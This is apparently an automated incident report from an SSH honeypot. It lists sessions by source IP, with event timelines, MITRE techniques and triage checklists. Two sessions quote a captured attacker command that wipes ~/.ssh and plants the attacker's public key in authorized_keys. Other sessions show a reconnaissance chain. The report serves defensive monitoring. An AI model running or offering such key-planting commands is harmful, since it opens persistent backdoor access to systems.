| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:05:21` | `cowrie.session.connect` |
| `2026-07-28 15:05:21` | `cowrie.client.version` |
| `2026-07-28 15:05:21` | `cowrie.client.kex` |
| `2026-07-28 15:05:22` | `cowrie.login.success` |
| `2026-07-28 15:05:24` | `cowrie.session.params` |
| `2026-07-28 15:05:24` | `cowrie.command.input` |
| `2026-07-28 15:05:24` | `cowrie.command.input` |
| `2026-07-28 15:05:24` | `cowrie.command.input` |
| `2026-07-28 15:05:24` | `cowrie.command.input` |
| `2026-07-28 15:05:24` | `cowrie.command.input` |
| `2026-07-28 15:05:24` | `cowrie.command.success` |
| `2026-07-28 15:05:24` | `cowrie.command.input` |
| `2026-07-28 15:05:24` | `cowrie.command.input` |
| `2026-07-28 15:05:24` | `cowrie.command.input` |
| `2026-07-28 15:05:24` | `cowrie.command.input` |
| `2026-07-28 15:05:25` | `cowrie.log.closed` |
| `2026-07-28 15:05:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3dd06b418f5

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 15:06 |
| **Last Seen** | 2026-07-28 15:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:06:33` | `cowrie.session.connect` |
| `2026-07-28 15:06:33` | `cowrie.client.version` |
| `2026-07-28 15:06:33` | `cowrie.client.kex` |
| `2026-07-28 15:06:34` | `cowrie.login.success` |
| `2026-07-28 15:06:35` | `cowrie.session.params` |
| `2026-07-28 15:06:35` | `cowrie.command.input` |
| `2026-07-28 15:06:35` | `cowrie.command.input` |
| `2026-07-28 15:06:35` | `cowrie.command.input` |
| `2026-07-28 15:06:35` | `cowrie.command.input` |
| `2026-07-28 15:06:35` | `cowrie.command.input` |
| `2026-07-28 15:06:35` | `cowrie.command.success` |
| `2026-07-28 15:06:35` | `cowrie.command.input` |
| `2026-07-28 15:06:35` | `cowrie.command.input` |
| `2026-07-28 15:06:35` | `cowrie.command.input` |
| `2026-07-28 15:06:35` | `cowrie.command.input` |
| `2026-07-28 15:06:36` | `cowrie.log.closed` |
| `2026-07-28 15:06:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-125e2051ff5b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 15:07 |
| **Last Seen** | 2026-07-28 15:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:07:46` | `cowrie.session.connect` |
| `2026-07-28 15:07:46` | `cowrie.client.version` |
| `2026-07-28 15:07:46` | `cowrie.client.kex` |
| `2026-07-28 15:07:47` | `cowrie.login.success` |
| `2026-07-28 15:07:49` | `cowrie.session.params` |
| `2026-07-28 15:07:49` | `cowrie.command.input` |
| `2026-07-28 15:07:49` | `cowrie.command.input` |
| `2026-07-28 15:07:49` | `cowrie.command.input` |
| `2026-07-28 15:07:49` | `cowrie.command.input` |
| `2026-07-28 15:07:49` | `cowrie.command.input` |
| `2026-07-28 15:07:49` | `cowrie.command.success` |
| `2026-07-28 15:07:49` | `cowrie.command.input` |
| `2026-07-28 15:07:49` | `cowrie.command.input` |
| `2026-07-28 15:07:49` | `cowrie.command.input` |
| `2026-07-28 15:07:49` | `cowrie.command.input` |
| `2026-07-28 15:07:49` | `cowrie.log.closed` |
| `2026-07-28 15:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af72d8848b05

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]173` |
| **First Seen** | 2026-07-28 15:08 |
| **Last Seen** | 2026-07-28 15:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:08:55` | `cowrie.session.connect` |
| `2026-07-28 15:08:55` | `cowrie.client.version` |
| `2026-07-28 15:08:55` | `cowrie.client.kex` |
| `2026-07-28 15:08:56` | `cowrie.login.success` |
| `2026-07-28 15:08:57` | `cowrie.session.params` |
| `2026-07-28 15:08:57` | `cowrie.command.input` |
| `2026-07-28 15:08:57` | `cowrie.command.failed` |
| `2026-07-28 15:08:57` | `cowrie.log.closed` |
| `2026-07-28 15:08:58` | `cowrie.session.params` |
| `2026-07-28 15:08:58` | `cowrie.command.input` |
| `2026-07-28 15:08:58` | `cowrie.session.file_download` |
| `2026-07-28 15:08:58` | `cowrie.log.closed` |
| `2026-07-28 15:09:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-717342b7274a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 15:08 |
| **Last Seen** | 2026-07-28 15:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:08:58` | `cowrie.session.connect` |
| `2026-07-28 15:08:58` | `cowrie.client.version` |
| `2026-07-28 15:08:58` | `cowrie.client.kex` |
| `2026-07-28 15:08:59` | `cowrie.login.success` |
| `2026-07-28 15:09:00` | `cowrie.session.params` |
| `2026-07-28 15:09:00` | `cowrie.command.input` |
| `2026-07-28 15:09:00` | `cowrie.command.input` |
| `2026-07-28 15:09:00` | `cowrie.command.input` |
| `2026-07-28 15:09:00` | `cowrie.command.input` |
| `2026-07-28 15:09:00` | `cowrie.command.input` |
| `2026-07-28 15:09:00` | `cowrie.command.success` |
| `2026-07-28 15:09:00` | `cowrie.command.input` |
| `2026-07-28 15:09:00` | `cowrie.command.input` |
| `2026-07-28 15:09:00` | `cowrie.command.input` |
| `2026-07-28 15:09:00` | `cowrie.command.input` |
| `2026-07-28 15:09:01` | `cowrie.log.closed` |
| `2026-07-28 15:09:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-335b7360e0b4

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]173` |
| **First Seen** | 2026-07-28 15:08 |
| **Last Seen** | 2026-07-28 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:08:58` | `cowrie.session.connect` |
| `2026-07-28 15:08:58` | `cowrie.client.version` |
| `2026-07-28 15:08:59` | `cowrie.client.kex` |
| `2026-07-28 15:09:00` | `cowrie.login.success` |
| `2026-07-28 15:09:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43c4144541fc

| Field | Detail |
|---|---|
| **Source IP** | `78.186.54[.]65` |
| **First Seen** | 2026-07-28 15:09 |
| **Last Seen** | 2026-07-28 15:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:09:00` | `cowrie.session.connect` |
| `2026-07-28 15:09:01` | `cowrie.client.version` |
| `2026-07-28 15:09:01` | `cowrie.client.kex` |
| `2026-07-28 15:09:02` | `cowrie.login.success` |
| `2026-07-28 15:09:02` | `cowrie.direct-tcpip.request` |
| `2026-07-28 15:09:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.186.54[.]65` to AbuseIPDB if not already reported
- [ ] Block `78.186.54[.]65` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89db2fd04905

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]173` |
| **First Seen** | 2026-07-28 15:09 |
| **Last Seen** | 2026-07-28 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:09:00` | `cowrie.session.connect` |
| `2026-07-28 15:09:00` | `cowrie.client.version` |
| `2026-07-28 15:09:01` | `cowrie.client.kex` |
| `2026-07-28 15:09:02` | `cowrie.login.success` |
| `2026-07-28 15:09:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c2dd3461993

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 15:10 |
| **Last Seen** | 2026-07-28 15:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:10:10` | `cowrie.session.connect` |
| `2026-07-28 15:10:11` | `cowrie.client.version` |
| `2026-07-28 15:10:11` | `cowrie.client.kex` |
| `2026-07-28 15:10:12` | `cowrie.login.success` |
| `2026-07-28 15:10:13` | `cowrie.session.params` |
| `2026-07-28 15:10:13` | `cowrie.command.input` |
| `2026-07-28 15:10:13` | `cowrie.command.input` |
| `2026-07-28 15:10:13` | `cowrie.command.input` |
| `2026-07-28 15:10:13` | `cowrie.command.input` |
| `2026-07-28 15:10:13` | `cowrie.command.input` |
| `2026-07-28 15:10:13` | `cowrie.command.success` |
| `2026-07-28 15:10:13` | `cowrie.command.input` |
| `2026-07-28 15:10:13` | `cowrie.command.input` |
| `2026-07-28 15:10:13` | `cowrie.command.input` |
| `2026-07-28 15:10:13` | `cowrie.command.input` |
| `2026-07-28 15:10:13` | `cowrie.log.closed` |
| `2026-07-28 15:10:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0791d5582cb

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-28 15:10 |
| **Last Seen** | 2026-07-28 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:10:58` | `cowrie.session.connect` |
| `2026-07-28 15:10:58` | `cowrie.client.version` |
| `2026-07-28 15:10:58` | `cowrie.client.kex` |
| `2026-07-28 15:10:59` | `cowrie.login.success` |
| `2026-07-28 15:11:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60237ff34ee6

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-28 15:10 |
| **Last Seen** | 2026-07-28 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:10:58` | `cowrie.session.connect` |
| `2026-07-28 15:10:58` | `cowrie.client.version` |
| `2026-07-28 15:10:58` | `cowrie.client.kex` |
| `2026-07-28 15:10:59` | `cowrie.login.success` |
| `2026-07-28 15:10:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bf22dacc547

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 15:11 |
| **Last Seen** | 2026-07-28 15:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:11:23` | `cowrie.session.connect` |
| `2026-07-28 15:11:23` | `cowrie.client.version` |
| `2026-07-28 15:11:23` | `cowrie.client.kex` |
| `2026-07-28 15:11:25` | `cowrie.login.success` |
| `2026-07-28 15:11:26` | `cowrie.session.params` |
| `2026-07-28 15:11:26` | `cowrie.command.input` |
| `2026-07-28 15:11:26` | `cowrie.command.input` |
| `2026-07-28 15:11:26` | `cowrie.command.input` |
| `2026-07-28 15:11:26` | `cowrie.command.input` |
| `2026-07-28 15:11:26` | `cowrie.command.input` |
| `2026-07-28 15:11:26` | `cowrie.command.success` |
| `2026-07-28 15:11:26` | `cowrie.command.input` |
| `2026-07-28 15:11:26` | `cowrie.command.input` |
| `2026-07-28 15:11:26` | `cowrie.command.input` |
| `2026-07-28 15:11:26` | `cowrie.command.input` |
| `2026-07-28 15:11:26` | `cowrie.log.closed` |
| `2026-07-28 15:11:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1d881447d54

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 15:12 |
| **Last Seen** | 2026-07-28 15:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:12:37` | `cowrie.session.connect` |
| `2026-07-28 15:12:37` | `cowrie.client.version` |
| `2026-07-28 15:12:37` | `cowrie.client.kex` |
| `2026-07-28 15:12:38` | `cowrie.login.success` |
| `2026-07-28 15:12:39` | `cowrie.session.params` |
| `2026-07-28 15:12:39` | `cowrie.command.input` |
| `2026-07-28 15:12:39` | `cowrie.command.input` |
| `2026-07-28 15:12:39` | `cowrie.command.input` |
| `2026-07-28 15:12:39` | `cowrie.command.input` |
| `2026-07-28 15:12:39` | `cowrie.command.input` |
| `2026-07-28 15:12:39` | `cowrie.command.success` |
| `2026-07-28 15:12:39` | `cowrie.command.input` |
| `2026-07-28 15:12:39` | `cowrie.command.input` |
| `2026-07-28 15:12:39` | `cowrie.command.input` |
| `2026-07-28 15:12:39` | `cowrie.command.input` |
| `2026-07-28 15:12:40` | `cowrie.log.closed` |
| `2026-07-28 15:12:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-268f36856782

| Field | Detail |
|---|---|
| **Source IP** | `36.26.78[.]218` |
| **First Seen** | 2026-07-28 15:13 |
| **Last Seen** | 2026-07-28 15:18 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:13:31` | `cowrie.session.connect` |
| `2026-07-28 15:13:32` | `cowrie.client.version` |
| `2026-07-28 15:13:32` | `cowrie.client.kex` |
| `2026-07-28 15:13:33` | `cowrie.login.success` |
| `2026-07-28 15:13:35` | `cowrie.session.params` |
| `2026-07-28 15:13:35` | `cowrie.command.input` |
| `2026-07-28 15:13:35` | `cowrie.command.failed` |
| `2026-07-28 15:13:35` | `cowrie.log.closed` |
| `2026-07-28 15:13:36` | `cowrie.session.params` |
| `2026-07-28 15:13:36` | `cowrie.command.input` |
| `2026-07-28 15:13:36` | `cowrie.session.file_download` |
| `2026-07-28 15:13:36` | `cowrie.log.closed` |
| `2026-07-28 15:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.26.78[.]218` to AbuseIPDB if not already reported
- [ ] Block `36.26.78[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fccdbfe647bc

| Field | Detail |
|---|---|
| **Source IP** | `220.80.223[.]144` |
| **First Seen** | 2026-07-28 15:13 |
| **Last Seen** | 2026-07-28 15:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:13:44` | `cowrie.session.connect` |
| `2026-07-28 15:13:44` | `cowrie.client.version` |
| `2026-07-28 15:13:44` | `cowrie.client.kex` |
| `2026-07-28 15:13:46` | `cowrie.login.success` |
| `2026-07-28 15:13:47` | `cowrie.direct-tcpip.request` |
| `2026-07-28 15:13:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.80.223[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.80.223[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b920c613c4d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 15:13 |
| **Last Seen** | 2026-07-28 15:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:13:54` | `cowrie.session.connect` |
| `2026-07-28 15:13:54` | `cowrie.client.version` |
| `2026-07-28 15:13:54` | `cowrie.client.kex` |
| `2026-07-28 15:13:55` | `cowrie.login.success` |
| `2026-07-28 15:13:56` | `cowrie.session.params` |
| `2026-07-28 15:13:56` | `cowrie.command.input` |
| `2026-07-28 15:13:56` | `cowrie.command.input` |
| `2026-07-28 15:13:56` | `cowrie.command.input` |
| `2026-07-28 15:13:56` | `cowrie.command.input` |
| `2026-07-28 15:13:56` | `cowrie.command.input` |
